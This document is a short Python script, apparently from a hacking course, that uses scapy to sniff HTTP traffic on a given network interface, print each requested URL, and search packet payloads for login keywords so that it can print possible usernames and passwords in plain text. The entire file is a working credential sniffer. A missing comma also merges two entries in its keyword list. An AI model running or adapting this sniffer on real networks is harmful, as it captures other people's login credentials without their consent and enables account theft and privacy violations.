#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Set Interface to listen on.")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an Interface to listen on, use --help for more information.")
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = [
            "username",
            "Username",
            "name",
            "Name",
            "user",
            "User",
            "user_name",
            "User_Name",
            "email",
            "Email",
            "login",
            "Login",
            "password",
            "Password",
            "pass",
            "Pass",
            "pin",
            "Pin",
            "user_password"
            "User_Password"
            ]
        for keyword in keywords:
            if keyword.encode() in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] Http Request >> " + url.decode('ascii'))
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info.decode('ascii') + "\n\n")


options = get_arguments()

sniff(options.interface)
